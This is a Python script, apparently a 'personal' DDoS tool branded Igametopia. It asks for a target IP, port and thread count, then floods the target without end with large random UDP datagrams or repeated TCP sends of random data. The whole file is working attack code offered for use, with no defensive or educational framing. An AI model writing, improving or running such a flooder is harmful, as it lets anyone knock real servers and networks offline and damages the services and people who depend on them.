#!/usr/bin/env python3
#Code by LeeOn123 Remake & Upgrade Tools By Igametopia
import os
import sys
import random
import socket
import threading
import time

os.system('color ' +random.choice(['a', 'b', 'c', 'd', 'e'])+ " & title IgamePersonal")
print("""
██╗ ██████╗  █████╗ ███╗   ███╗███████╗████████╗ ██████╗ ██████╗ ██╗ █████╗ 
██║██╔════╝ ██╔══██╗████╗ ████║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██║██╔══██╗
██║██║  ███╗███████║██╔████╔██║█████╗     ██║   ██║   ██║██████╔╝██║███████║
██║██║   ██║██╔══██║██║╚██╔╝██║██╔══╝     ██║   ██║   ██║██╔═══╝ ██║██╔══██║
██║╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗   ██║   ╚██████╔╝██║     ██║██║  ██║
╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝                                                                                               
                                                                             """)

print("Tools Version : Personal")
print("Tools By : Igametopia")
print("Tools Personal Max Send 6 GBPS")

ip = str(input(">> IP Address :"))
port = int(input(">> Port : "))
choice = str(input(">> Method : "))
times = int(input(">> Packets : "))
threads = int(input(">> Threads : "))
def run():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(100048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("PERSONAL TOOLS ATTACK " + ip)

for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
